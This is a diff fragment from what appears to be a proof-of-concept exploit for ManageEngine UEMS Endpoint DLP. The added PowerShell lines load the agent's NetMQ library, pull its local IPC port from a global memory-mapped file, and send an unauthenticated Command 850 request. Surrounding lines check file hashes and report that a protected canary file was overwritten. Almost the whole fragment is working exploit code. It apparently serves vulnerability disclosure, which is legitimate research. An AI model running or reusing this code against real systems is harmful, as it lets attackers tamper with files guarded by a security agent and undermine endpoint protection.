@@ -223,6 +223,36 @@ Then go to elevated PowerShell and verify the overwrite:
 
 $after = (Get-FileHash "C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf").Hash
 Write-Host "AfterSHA256=$after"
+
+
+//--
+
+Line 1:
+Add-Type -Path "C:\Program Files (x86)\ManageEngine\UEMS_Agent\EndpointDLP\bin\NetMQ.dll"
+
+Line 2:
+$mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting("Global\{37669676-A539-4FAF-BB0E-FBCE2F90B099}", [System.IO.MemoryMappedFiles.MemoryMappedFileRights]::Read)
+
+Line 3:
+$stream = $mmf.CreateViewStream(0, 256, [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::Read)
+
+Line 4:
+$bytes = (New-Object System.IO.BinaryReader($stream)).ReadBytes(256)
+
+Line 5:
+$port = [System.Text.Encoding]::Unicode.GetString($bytes).Trim([char]0)
+
+Line 6:
+Write-Host "DiscoveredMEDLPPort=$port"
+
+Line 7:
+$req = New-Object NetMQ.Sockets.RequestSocket; $req.Connect("tcp://127.0.0.1:$port")
+
+Line 8:
+$req.SendFrame('{"Command":850,"ShadowFolder":"C:\\Windows\\Temp\\UEMS-MEDLP-CMD850","TotalPages":1}')
+
+Line 9:
+Write-Host "Response=$($req.ReceiveFrameString())"; $req.Dispose()
 Write-Host "AfterSize=$((Get-Item 'C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf').Length) bytes"
 Write-Host "ProtectedCanaryOverwritten=True"
 
